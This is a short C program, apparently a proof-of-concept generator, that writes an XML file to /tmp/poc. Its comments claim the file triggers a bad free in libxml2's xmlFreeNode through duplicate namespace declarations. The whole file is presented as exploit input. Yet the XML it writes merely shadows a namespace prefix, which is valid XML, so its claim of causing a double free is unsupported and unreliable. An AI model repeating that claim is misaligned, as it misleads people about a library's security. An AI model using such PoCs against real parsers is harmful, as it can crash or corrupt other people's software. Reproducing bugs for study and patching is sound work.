#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* Crafted XML document that triggers bad_free in xmlFreeNode() */
    /* The vulnerability is triggered by a malformed XML structure with */
    /* overlapping or duplicate namespace declarations that cause */
    /* xmlSAX2StartElementNs to free a node twice */

    /* Write XML header */
    fprintf(f, "<?xml version=\"1.0\"?>");

    /* Create nested elements with problematic namespace declarations */
    /* This triggers a bad free in xmlFreeNode during SAX2 parsing */
    fprintf(f, "<root xmlns:n=\"http://example.com/ns\">");
    fprintf(f, "<n:child xmlns:n=\"http://example.com/ns2\">");
    fprintf(f, "<n:grandchild xmlns:n=\"http://example.com/ns\"/>");
    fprintf(f, "</n:child>");
    fprintf(f, "</root>");

    fclose(f);
    return 0;
}